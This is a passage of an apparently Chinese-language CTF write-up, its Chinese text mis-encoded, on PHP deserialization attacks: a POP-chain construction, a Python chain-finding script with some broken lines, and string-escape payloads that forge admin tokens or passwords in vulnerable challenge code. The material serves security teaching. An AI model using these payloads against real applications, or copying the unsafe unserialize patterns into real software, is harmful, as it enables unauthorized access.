php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//hint is in hint.php</span><br>error_reporting(<span class="hljs-number">1</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I think you need /etc/hint . Before this you need to see the source code&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_sayhello</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hi&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_sayhello();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;give you flag : &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;flag;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$phonenumber</span> = <span class="hljs-number">123123</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$promise</span> = <span class="hljs-string">&#x27;I do&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;promise = <span class="hljs-string">&#x27;I will not !!!!&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;promise;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="hljs-string">&#x27;ffiilleennaammee&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth_to_set</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_hint</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$hint</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$hint</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-keyword">$this</span>-&gt;Get_hint(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$hi</span> = <span class="hljs-keyword">new</span> Start();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ„é€ ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Start();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Info();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$c</span>-&gt;a = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$b</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<h4 id="2021-å¼ºç½‘æ¯-POP-masterï¼š"><a href="#2021-å¼ºç½‘æ¯-POP-masterï¼š" class="headerlink" title="2021 å¼ºç½‘æ¯ POP_masterï¼š"></a>2021 å¼ºç½‘æ¯ POP_masterï¼š</h4><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php">https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php</a></p>
<p>è„šæœ¬æ‰¾é“¾</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br><span class="hljs-keyword">import</span> nose<br><br>parser = make_parser()<br>func_name = <span class="hljs-string">&quot;find your func&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./qwb/class.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer)<br>functions = &#123;&#125;<br>target = functions[func_name] i = <span class="hljs-number">0</span><br><span class="hljs-comment"># å¼ºèµ‹å€¼å‡½æ•°ç›´æ¥è·³è¿‡</span><br>skip_func = []<br>pop_chain = []<br>pop_chain.append(func_name) e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>	class_name = out.name<br>	<span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br>		<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>			functions[node.name] = out<br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br>	<span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br>		<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>			<span class="hljs-keyword">if</span> node.name == func_name:<br>				<span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>					<span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br>						<span class="hljs-comment"># print(subnode)</span><br>						<span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br>							<span class="hljs-keyword">continue</span><br>						target = functions[subnode.name]<br>						func_name = subnode.name<br>						pop_chain.append(func_name)<br>						<span class="hljs-keyword">break</span><br>					<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br>						<span class="hljs-comment"># print(subnode)</span><br>						<span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br>							<span class="hljs-comment"># print(subnode.node.name)</span><br>							<span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br>								<span class="hljs-keyword">continue</span><br>							target = functions[subnode.node.name]<br>							func_name = subnode.node.name<br>							pop_chain.append(func_name)<br>							<span class="hljs-keyword">break</span><br>						<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == Eval):<br>							e = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br>	<span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br>		<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br>			<span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>				<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br>				<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br>				<span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br>					<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>				<span class="hljs-keyword">else</span>:<br>					<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> +<br>					functions[pop_chain[i+<span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br>				<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>	i += <span class="hljs-number">1</span><br>	<span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br>		<span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å­—ç¬¦ä¸²é€ƒé€¸"></a>å­—ç¬¦ä¸²é€ƒé€¸</h2><p>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>&#125;</code> ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ– ã€‚å¦‚ä¸‹å›¾ï¼Œout!å¹¶ä¸ä¼šè¢«åºåˆ—åŒ–</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135305824.png" srcset="/img/loading.gif" lazyload></p>
<p>å½“æŸä¸ªå±æ€§çš„å­—ç¬¦ä¸²é•¿åº¦ä¸ä¸€è‡´æ—¶ä¹Ÿä¸ä¼šè¢«åºåˆ—åŒ–æˆåŠŸ</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135505974.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="å¢å¤šï¼š"><a href="#å¢å¤šï¼š" class="headerlink" title="å¢å¤šï¼š"></a>å¢å¤šï¼š</h3><ul>
<li>ctfshow 262</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> message(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$msg</span>));<br>    setcookie(<span class="hljs-string">&#x27;msg&#x27;</span>,base64_encode(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>

<p>å‰é¢æ³¨é‡Šå‘ç°æœ‰ä¸ª<code>message.php</code> ,è®¿é—®ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<p>æŠŠ base64 ç¼–ç åçš„ç»“æœæ”¾åˆ° cookie é‡Œé¢è®¿é—® message.php å°±èƒ½æ‹¿åˆ° flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> message(a,b,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$c</span>));<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$umsg</span>);<br></code></pre></td></tr></table></figure>

<p>æˆ–è€…ç›´æ¥åœ¨ index.php ä¼ å€¼</p>
<blockquote>
<p>f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckâ€;s:5:â€tokenâ€;s:5:â€adminâ€;}</p>
</blockquote>
<p>è®¿é—® message.php</p>
<ul>
<li>æŸæ ¡çš„ä¸€é¢˜</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;secured&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ­¥éª¤ï¼š</p>
<p>é¦–å…ˆå¾—åˆ°åºåˆ—åŒ–çš„å­—ç¬¦ä¸²<code>O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Marble&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p>
<p>æˆªå–éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p>
<p>é•¿åº¦ä¸º 31ï¼Œsecure å…¨éƒ¨æ›¿æ¢ä¸º securedï¼Œå­—ç¬¦ä¸²+1ï¼Œåˆ™éœ€è¦<code>31</code>ä¸ª secure æŠŠç›®æ ‡å­—ç¬¦ä¸²é¡¶å‡ºå»</p>
<p>payloadï¼š</p>
<blockquote>
<p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecureâ€;s:8:â€passwordâ€;s:6:â€hackerâ€;}&amp;password=</p>
</blockquote>
<p>é¢˜ç›®æ”¹ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;securing&#x27;</span>, <span class="hljs-variable">$str</span>);<br><br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;love&#x27;</span>, <span class="hljs-string">&#x27;lover&#x27;</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯è§æ­¤å¤„ secure å˜ä¸ºäº† secureï¼Œlove å˜ä¸º lover</p>
